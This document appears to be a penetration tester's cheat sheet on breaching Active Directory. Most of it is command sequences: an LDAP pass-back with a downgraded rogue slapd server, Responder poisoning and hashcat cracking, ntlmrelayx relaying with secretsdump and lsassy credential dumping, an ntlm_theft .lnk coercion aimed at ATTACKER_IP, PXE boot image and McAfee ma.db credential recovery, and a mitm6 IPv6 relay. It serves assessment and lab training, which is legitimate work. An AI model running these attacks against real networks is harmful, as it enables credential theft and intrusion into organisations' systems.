# Initial Access / Breaching

* NTLM Authenticated Services
* LDAP Bind Credentials
* Authentication Relays
* Microsoft Deployment Toolkit
* Configuration Files

OSINT and Phishing

## NTML Authenticated Services

* Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
* Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
* Exposed VPN endpoints that were integrated with AD.
* Web applications that are internet-facing and make use of NetNTLM.

## LDAP Bind Credentials

{% code overflow="wrap" fullWidth="true" %}
```sh
# LDAP Pass-back Attacks
Try to make network devices, such as printers, connect to our rogue device by altering LDAP configuration and intercepting LDAP authentication.
nc -lvnp 389
Then change server IP to our IP 
# In case we receive supportedCapabilities, it means we have a problem and creds will not be transmitted. We need to create a rogue LDAP server
# Hosting a Rogue LDAP Server
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
# Provide any Administrator password
sudo dpkg-reconfigure -p low slapd
- <No> when requested if you want to skip server configuration
- For the DNS domain name, you want to provide our target domain // Use this same name for the Organisation name as well
- Provide any Administrator password
- Select MDB as the LDAP database to use
- For the last two options, ensure the database is not removed when purged
- Move old database files before a new one is created
# Make rogue LDAP vulnerable by downgrading the supported authentication mechanisms (supports PLAIN and LOGIN auth). Create new ldif file:
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred 
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
# Verify our rogue LDAP server's configuration (in Kali we might see nothing)
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
# Capturing LDAP Credentials
sudo tcpdump -SX -i breachad tcp port 389
# Try the attack again and should see  LDAP Connection failed: The distinguished name contains invalid syntax but tcpdump would capture the creds 
```
{% endcode %}

## Old machine accounts

Inherent vulnerability user=pass, also try using the pre2k tool to find weak password users

[https://github.com/garrettfoster13/pre2k](https://github.com/garrettfoster13/pre2k)

## Authentication Relays

Look at wo different exploits for NetNTLM authentication with SMB:

* Since the (Net)NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
* We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to. On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected.

By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.

```bash
# NOTE: confirm with cme that SMB signing:False

# Intercepting NetNTLM Challenge
https://github.com/lgandx/Responder
sudo responder -I tun0
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : $domain\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::$domain:<NTLMv2-SSP Hash>
hashcat -m 5600 <hash file> <password file> --force
```

## Relaying the Challenge

* SMB Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB signing is enabled, we won't be able to forge the message signature, meaning the server would reject it.
* The associated account needs the relevant permissions on the server to access the requested resources. Ideally, we are looking to relay the challenge and response of an account with administrative privileges over the server, as this would allow us to gain a foothold on the host.
* Since we technically don't yet have an AD foothold, some guesswork is involved into what accounts will have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

## NTLM Relay

{% code overflow="wrap" fullWidth="true" %}
```bash
# First get a list of unsigned SMB hosts
netexec smb 192.168.56.10-23 --gen-relay-list relay.txt
# Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder SMB and HTTP server as we donâ€™t want to get the hashes directly but we want to relay them to ntlmrelayx.
sed -i 's/HTTP = On/HTTP = Off/g' .../Responder.conf && sed -i 's/SMB = On/SMB = Off/g' .../Responder.conf && head -n 20 .../Responder.conf
# Now start ntlmrelayx
ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
# If we get some connections and one says ADMIN = TRUE, we can retrieve hashes
proxychains secretsdump -no-pass '$DOMAIN'/'$USER'@'$IP'
proxychains lsassy --no-pass $IP -u $USER -d $DOMAIN
```
{% endcode %}

## Coercion (.lnk file)

{% code overflow="wrap" fullWidth="true" %}
```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy # generate .lnk using ATTACKER_ip in the stealthy directory
```
{% endcode %}

## Microsoft Deployment Toolkit

{% code overflow="wrap" fullWidth="true" %}
```sh
# MDT automates the deployment of Window OS. SSCM does patch management and can test patches in a sandbox environment.3
# PXE Boot, how to exploit it
    Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
    Perform password scraping attacks to recover AD credentials used during the install.
# PXE Boot Image Retrieval (we need MDT server IP and BCD files which we would request via TFT and enum the config of them)
tftp -i <MDT IP> GET "\Tmp\...bcd" conf.bcd
https://github.com/wavestone-cdt/powerpxe
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
# WIM files are bootable images in the Windows Imaging Format (WIM). Download that image:
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
# Recovering Credentials from a PXE Boot Image
Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```
{% endcode %}

## Configuration Files

* Web application config files
* Service configuration files
* Registry keys
* Centrally deployed applications

{% code overflow="wrap" %}
```sh
# Centrally deployed applications -> McAfee Enterprise Endpoint Security
dir C:\ProgramData\McAfee\Agent\DB\ma.db
# Copy that file (where credentials of the associated AD service account might be found) to our attacking machine
# Read the database file
sqlitebrowser ma.db
# Focus on AGENT_REPOSITORIES table where we find the encrypted password
https://github.com/funoverip/mcafee-sitelist-pwd-decryption
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```
{% endcode %}

#### IPv6 attacks

{% code overflow="wrap" fullWidth="true" %}
```sh
https://youtu.be/AmcWc2CjXx8?si=Wjkx3isi2QwVf_iL

sudo nmap -6 dc2022.lab.net

impacket-ntlmrelayx -6 -t ldaps://192.168.1.116 -wh fakewpad.lab.net -l dumpped-lootinfo

sudo mitm6 -i eth1 -d lab.net

- Security tools focus on IPv4, leaving IPv6 unmonitored
- IPv6 auto-configures on many Windows/Linux hosts
- MITM6 attacks force authentication over IPv6
- NTLM relay works seamlessly over IPv6
- IPv6 tunnels bypass network segmentation
```
{% endcode %}
